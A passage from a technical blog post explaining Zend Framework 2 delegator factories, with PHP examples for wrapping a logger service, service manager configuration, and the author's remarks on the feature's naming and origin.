    to either replace the real service with a "delegate", or interact with an object
    produced by a factory before it is returned by the <code>Zend\ServiceManager</code>.
</p>

<p>
    In pseudo-code, a delegator-factory is doing following:
</p>

<pre><code class="javascript">service = delegatorFactory(factory());
</code></pre>

<p>
    This is the interface for a delegator factory:
</p>

<pre><code class="php">&lt;?php

namespace Zend\ServiceManager;

interface DelegatorFactoryInterface
{
    public function createDelegatorWithName(
        ServiceLocatorInterface $serviceLocator,
        $name,
        $requestedName,
        $callback
    );
}
</code></pre>

<hr/>

<h2>Delegator Factories applied to the Logger problem</h2>

<p>
    This is how we would use it to modify our <code>"DbLoggingModule\Logger"</code> service:
</p>

<pre><code class="php">&lt;?php

class LoggerDelegatorFactory implements DelegatorFactoryInterface
{
    public function createDelegatorWithName(
        ServiceLocatorInterface $serviceLocator,
        $name,
        $requestedName,
        $callback
    ) {
        $logger = $callback();

        $logger-&gt;clearFilters();
        $logger-&gt;addFormatter(new HttpRequestContextFormatter());

        return $logger;
    }
}
</code></pre>

<p class="alert alert-info">
    <span class="label label-info">Note:</span> We are not using the first 3 parameters,
    which may be useful in different contexts (for example, when configuration is needed).
</p>

<p>
    We then add it to our service manager configuration to instruct the
    <code>Zend\ServiceManager</code> that we want our delegator factory to be used
    whenever the service <code>"DbLoggingModule\Logger"</code> is requested:
</p>

<pre><code class="php">&lt;?php
return [
    'delegators' =&gt; [
        'DbLoggingModule\Logger' =&gt; [
            'LoggerDelegatorFactory',
            // can add more of these delegator factories here
        ],
    ],
];
</code></pre>

<p>
    This will make the <code>Zend\ServiceManager</code> call the the
    <code>LoggerDelegatorFactory#createDelegatorWithName()</code> method
    whenever the service <code>"DbLoggingModule\Logger"</code> is instantiated,
    regardless if it is built via invokable, factory, peering service manager or
    abstract factory.
</p>

<p class="alert alert-info">
    <span class="label label-info">Hint:</span> You can define more of these delegator
    service factories for a single service, which allow you to override service
    instantiation logic in different modules and multiple
    times, leading to a very fine-grained configuration flexibility.
</p>

<p class="alert alert-info">
    <span class="label label-info">Hint:</span> Assuming that you want to completely replace the
    <code>"DbLoggingModule\Logger"</code> with your own custom implementation depending on
    context, you could also completely avoid using the provided <code>$callback</code>.
    This way, the original service won't even be instantiated.
</p>

<h2>On naming</h2>

<p>
    The name <q>delegator factory</q> is actually something I'm not happy with, since
    they are actually just wrappers around an existing factory.
</p>

<p class="alert alert-error">
    <span class="label label-warning">Warning:</span> Since I'm the first guy
    <a href="https://twitter.com/Ocramius/status/441673095662018561" target="_blank">to shout out at Laravel Facades</a>,
    I want to make it clear that the naming "Delegator Factory" is wrong, that
    it was my mistake, and I will likely fix it for ZendFramework 3.x.
</p>

<p>
    I initially designed these factories to solve a different problem, which is
    <a href="https://framework.zend.com/manual/2.3/en/modules/zend.service-manager.lazy-services.html" target="_blank">Lazy Services</a>.
</p>

<p>
    In the context of lazy services and decorators, the instance returned by these factories
    is indeed a
    "<a href="https://en.wikipedia.org/wiki/Delegation_pattern" target="_blank">delegate</a>",
    therefore I came up with the name "delegator factory".
</p>

<p>
    Only later on I realized that these factories are actually much more powerful than
    what I originally designed them for, therefore the "delegator factory" name became inadequate.
</p>

<hr/>

<h2>Conclusions</h2>

<p>
    Delegator factories are vital to any ZF2 hacker. Any developer working with <code>Zend\ServiceManager</code>
    should also be familiar with this functionality and its usage.
</p>

<p>
    Delegator factories are not a new concept. For instance, Pimple introduced this concept
    a while ago and (in a limited form): it is called
    "<a href="https://github.com/fabpot/Pimple#modifying-services-after-creation" target="_blank">extending a service</a>".
</p>

<p>
    The entire functionality was introduced by accident while I was working on an implementation of
    <a href="https://ocramius.github.io/blog/zf2-and-symfony-service-proxies-with-doctrine-proxies/" target="_blank">Lazy Services</a>,
    and they surely need a rename. This will not happen in Zend Framework 2.x.
</p>

<p>
    I hope this helps you with your day-to-day hacking around your ZF2 apps!
